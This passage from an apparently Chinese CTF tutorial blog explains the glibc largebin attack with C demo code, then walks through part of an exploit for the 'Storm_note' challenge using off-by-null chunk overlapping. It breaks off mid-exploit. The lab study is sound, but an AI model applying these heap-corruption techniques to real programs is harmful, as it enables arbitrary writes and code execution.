    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;最后申请第三个 large chunk 在: %p\n&quot;</span><span class="token punctuation">,</span> p3 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;申请一个 fastbin 大小的防止 free 的时候第三个 large chunk 与 top chunk 合并\n\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;free 掉第一个和第二个 chunk，他们会被放在 unsorted bin 中 [ %p &lt;--&gt; %p ]\n\n&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p2 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;现在去申请一个比他俩小的，然后会把第一个分割出来，第二个则被整理到 largebin 中，第一个剩下的会放回到 unsortedbin 中 [ %p ]\n\n&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p1 <span class="token operator">+</span> <span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">free</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;free 掉第三个，他会被放到 unsorted bin 中: [ %p &lt;--&gt; %p ]\n\n&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p3 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;假设有个漏洞，可以覆盖掉第二个 chunk 的 \&quot;size\&quot; 以及 \&quot;bk\&quot;、\&quot;bk_nextsize\&quot; 指针\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;减少释放的第二个 chunk 的大小强制 malloc 把将要释放的第三个 large chunk 插入到 largebin 列表的头部（largebin 会按照大小排序）。覆盖掉栈变量。覆盖 bk 为 stack_var1-0x10，bk_nextsize 为 stack_var2-0x20\n\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    p2<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x3f1</span><span class="token punctuation">;</span>
    p2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    p2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    p2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stack_var1 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    p2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stack_var2 <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;再次 malloc，会把释放的第三个 chunk 插入到 largebin 中，同时我们的目标已经改写了:\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;stack_var1 (%p): %p\n&quot;</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>stack_var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;stack_var2 (%p): %p\n&quot;</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>stack_var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br></div></div><p>​    该技术可用于修改任意地址的值，例如栈上的变量stack_var1和 stack_var2。在实践中常常作为其他漏洞利用的前奏，例如在fastbin attack 中用于修改全局变量global_max_fast为一个很大的值。</p> <p>​    首先我们分配 chunk p1, p2 和 p3，并且在它们之间插入其他的 chunk 以防止在释放时被合并。</p> <p><img src="/images/heap/image-20211226161649066.png" alt="image-20211226161649066"></p> <p>​    接下来释放p1和p2，它们被放入unsorted bin中。</p> <p><img src="/images/heap/image-20211226161654862.png" alt="image-20211226161654862"></p> <p>​    接下来去申请一个0x90大小的堆块，他会把前面那个0x320大小的堆块切割，同时会给unsorted bin中的free chunk进行整理划分，把那第二块大的放到large bin，第一个剩余的放回到unsorted bin中。</p> <p><img src="/images/heap/image-20211226161700142.png" alt="image-20211226161700142"></p> <p>​    接着free掉p3，将其放入unsorted bin，我们伪造的分别是p2的size、bk以及bk_nextsize，紧接着进行malloc操作，将p3整合进large bin。</p> <p><img src="/images/heap/image-20211226161705314.png" alt="image-20211226161705314"></p> <p>​    Large bin是按照fd指针的顺序从大到小排列的，所以需要进行排序，排序的操作大概是：</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token comment">//victim是p3、fwd是修改后的p2</span>
<span class="token punctuation">{</span>
    victim<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> fwd<span class="token punctuation">;</span><span class="token comment">//1</span>
    victim<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-&gt;</span>bk_nextsize<span class="token punctuation">;</span><span class="token comment">//2</span>
    fwd<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span><span class="token comment">//3</span>
    victim<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span><span class="token comment">//4</span>
<span class="token punctuation">}</span>
victim<span class="token operator">-&gt;</span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
victim<span class="token operator">-&gt;</span>fd <span class="token operator">=</span> fwd<span class="token punctuation">;</span>
fwd<span class="token operator">-&gt;</span>bk <span class="token operator">=</span> victim<span class="token punctuation">;</span>
bck<span class="token operator">-&gt;</span>fd <span class="token operator">=</span> victim<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>​    把2带入4得到：fwd-&gt;bk_nextsize-&gt;fd_nextsize=victim，同时下面有：fwd-&gt;bk=victim。也就是说之前我们伪造的p2的bk跟bk_nextsize指向的地址被改为了victim，即(unsigned long)(&amp;stack_var1 - 2)与(unsigned long)(&amp;stack_var2 - 4)被改为了victim。</p> <p><img src="/images/heap/image-20211226161716402.png" alt="image-20211226161716402"></p> <h2 id="西湖论剑storm-note">西湖论剑<a href="https://bbs.pediy.com/thread-254849.htm" target="_blank" rel="noopener noreferrer">Storm_note<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> <a href="#西湖论剑storm-note" class="header-anchor">#</a></h2> <p>赛题下载后，checksec查看程序的保护机制</p> <p><img src="/images/heap/image-20211226161859447.png" alt="image-20211226161859447"></p> <h3 id="程序分析">程序分析 <a href="#程序分析" class="header-anchor">#</a></h3> <h4 id="init-proc函数">init_proc函数 <a href="#init-proc函数" class="header-anchor">#</a></h4> <p>​    程序一开始就对进程进行初始化，<code>mallopt(1, 0)</code>禁用了fastbin，然后通过mmap在0xABCD0000分配了一个页面的可读可写空间，最后往里面写入一个随机数。</p> <p><img src="/images/heap/image-20211226161959441.png" alt="image-20211226161959441"></p> <h4 id="alloc-note函数">alloc_note函数 <a href="#alloc-note函数" class="header-anchor">#</a></h4> <p>​    首先遍历全局变量note，找到一个没有存放内容的地方保存堆指针。然后限定了申请的堆的大小最多为0xFFFFF，调用calloc函数来分配堆空间，因此返回</p> <p>前会对分配的堆的内容进行清零。</p> <p><img src="/images/heap/image-20211226162007268.png" alt="image-20211226162007268"></p> <h4 id="edit-note函数">edit_note函数 <a href="#edit-note函数" class="header-anchor">#</a></h4> <p>​     存在一个off_by_null漏洞，在read后v2保存写入的字节数，最后在该偏移处的字节置为0，形成off_by_null。</p> <p><img src="/images/heap/image-20211226162020179.png" alt="image-20211226162020179"></p> <h4 id="delete-note函数">delete_note函数 <a href="#delete-note函数" class="header-anchor">#</a></h4> <p>​    这个函数就是正常free堆指针，并置0。</p> <p><img src="/images/heap/image-20211226162039560.png" alt="image-20211226162039560"></p> <h4 id="backdoor函数">backdoor函数 <a href="#backdoor函数" class="header-anchor">#</a></h4> <p>​    程序提供一个可以直接getshell的后门，触发的条件就是输入的数据与mmap映射的空间的前48个字节相同。</p> <p><img src="/images/heap/image-20211226162057414.png" alt="image-20211226162057414"></p> <h3 id="利用思路">利用思路 <a href="#利用思路" class="header-anchor">#</a></h3> <ol><li><p>利用off_by_null漏洞实现chunk overlapping，从而控制堆块内容。</p></li> <li><p>将处于unsortedbin的可控制的chunk放入largebin中，以便触发largebin attack</p></li> <li><p>伪造largebin的bk和bk_nextsize指针，通过malloc触发漏洞，分配到目标地址，实现任意地址写。</p></li> <li><p>触发后门</p></li></ol> <h3 id="调试过程">调试过程 <a href="#调试过程" class="header-anchor">#</a></h3> <h4 id="_1-chunk-overlapping">1.Chunk overlapping <a href="#_1-chunk-overlapping" class="header-anchor">#</a></h4> <p>​    首先分配7个chunk，chunk1和chunk4是用于放入largebin的大chunk，chunk6防止top chunk合并。Chunk结构如下。</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment">#0</span>
add<span class="token punctuation">(</span><span class="token number">0x508</span><span class="token punctuation">)</span> <span class="token comment">#1</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment">#2</span>

add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment">#3</span>
add<span class="token punctuation">(</span><span class="token number">0x508</span><span class="token punctuation">)</span> <span class="token comment">#4</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment">#5</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment">#6</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p><img src="/images/heap/image-20211226162219738.png" alt="image-20211226162219738"></p> <p>​    构造两个伪造的prev_size，用于绕过malloc检查，保护下一个chunk的prev_size不被修改。如下图所示。</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x4f0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#prev_size</span>
edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x4f0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#prev_size</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><img src="/images/heap/image-20211226162256759.png" alt="image-20211226162256759"></p> <p>​    接着利用off by null漏洞改写chunk 1的size为0x500。</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment">#off by null</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><img src="/images/heap/image-20211226162339888.png" alt="image-20211226162339888"></p> <p>​    然后就可以进行chunk overlap了, 先将0x20的chunk释放掉，然后释放chunk2，这时触发unlink。</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment">#1</span>
add<span class="token punctuation">(</span><span class="token number">0x4d8</span><span class="token punctuation">)</span> <span class="token comment">#7 </span>

free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token comment">#overlap</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><img src="/images/heap/image-20211226162411250.png" alt="image-20211226162411250"></p> <p>​    接下来用同样的方法对第二个大小为0x510的chunk进行overlapping。</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment">#off by null</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>        <span class="token comment">#4</span>
add<span class="token punctuation">(</span><span class="token number">0x4d8</span><span class="token punctuation">)</span>       <span class="token comment">#8 </span>
free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>          <span class="token comment">#overlap</span>
add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>        <span class="token comment">#4 </span>
edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h4 id="_2-放入large-bin">2.放入large bin <a href="#_2-放入large-bin" class="header-anchor">#</a></h4> <p>​    那么如何将unsorted bin中的chunk放入large bin呢？下面是glibc判断</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-&gt;</span>bk<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//从第一个unsortedbin的bk开始遍历</span>
<span class="token punctuation">{</span>
    bck <span class="token operator">=</span> victim<span class="token operator">-&gt;</span>bk<span class="token punctuation">;</span>
    size <span class="token operator">=</span> <span class="token function">chunksize</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span><span class="token comment">//&lt;_int_malloc+627&gt;</span>
        bck <span class="token operator">==</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
        victim <span class="token operator">==</span> av<span class="token operator">-&gt;</span>last_remainder <span class="token operator">&amp;&amp;</span>
        <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb <span class="token operator">+</span> MINSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">//unsorted_bin的最后一个，并且该bin中的最后一个chunk的size大于我们申请的大小</span>
    <span class="token punctuation">{</span>remainder_size <span class="token operator">=</span> size <span class="token operator">-</span> nb<span class="token punctuation">;</span>
     remainder <span class="token operator">=</span> <span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token comment">//将选中的chunk剥离出来，恢复unsortedbin</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>bck<span class="token operator">-&gt;</span>fd <span class="token operator">!=</span> victim<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-&gt;</span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>    <span class="token comment">//largebin attack</span>
    <span class="token comment">//注意这个地方，将unsortedbin的bk设置为victim-&gt;bk，如果我设置好了这个bk并且能绕过上面的检查,下次分配就能将target chunk分配出来</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> nb<span class="token punctuation">)</span><span class="token comment">//size相同的情况同样正常分配</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//放入smallbin</span>
     <span class="token punctuation">{</span>
        victim_index <span class="token operator">=</span> <span class="token function">smallbin_index</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
        bck <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim_index<span class="token punctuation">)</span><span class="token punctuation">;</span>
        fwd <span class="token operator">=</span> bck<span class="token operator">-&gt;</span>fd<span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
     <span class="token keyword">else</span><span class="token comment">//放入large bin</span>
     <span class="token punctuation">{</span>
         <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size <span class="token operator">&lt;</span> <span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
         <span class="token punctuation">{</span>
            fwd <span class="token operator">=</span> fwd<span class="token operator">-&gt;</span>fd_nextsize<span class="token punctuation">;</span><span class="token comment">//fd_nextsize指向比当前chunk小的下一个chunk</span>
            <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">chunk_main_arena</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size
                          <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token function">chunksize_nomask</span> <span class="token punctuation">(</span>fwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
                        <span class="token comment">/* Always insert in the second position.  */</span>
             fwd <span class="token operator">=</span> fwd<span class="token operator">-&gt;</span>fd<span class="token punctuation">;</span>
          <span class="token keyword">else</span><span class="token comment">// 插入</span>
          <span class="token punctuation">{</span>
            <span class="token comment">//解链操作，nextsize只有largebin才有</span>
            victim<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> fwd<span class="token punctuation">;</span>
            victim<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-&gt;</span>bk_nextsize<span class="token punctuation">;</span>
            fwd<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
            victim<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span><span class="token comment">//fwd-&gt;bk_nextsize-&gt;fd_nextsize=victim</span>
           <span class="token punctuation">}</span>
          bck <span class="token operator">=</span> fwd<span class="token operator">-&gt;</span>bk<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
   <span class="token punctuation">}</span>
 <span class="token keyword">else</span>
     victim<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> victim<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
 <span class="token function">mark_bin</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim_index<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//解链操作2,fd,bk</span>
 victim<span class="token operator">-&gt;</span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
 victim<span class="token operator">-&gt;</span>fd <span class="token operator">=</span> fwd<span class="token punctuation">;</span>
 fwd<span class="token operator">-&gt;</span>bk <span class="token operator">=</span> victim<span class="token punctuation">;</span>
 bck<span class="token operator">-&gt;</span>fd <span class="token operator">=</span> victim<span class="token punctuation">;</span>
<span class="token comment">//fwd-&gt;bk-&gt;fd=victim</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br></div></div><p>​    大概意思就是说我们申请堆块时，glibc会从unsorted bin末尾开始遍历，倘若遍历到不符合我们的要求大小，那么系统会做sorted——重新把这个free chunk放入small bin或large bin中。</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>     <span class="token comment">#unsortedbin-&gt; chunk2 -&gt; chunk5(0x4e0)which size is largebin FIFO</span>
add<span class="token punctuation">(</span><span class="token number">0x4e8</span><span class="token punctuation">)</span>  <span class="token comment">#put chunk5(0x4e0) to largebin</span>
free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>     <span class="token comment">#put chunk2 to unsortedbin</span>
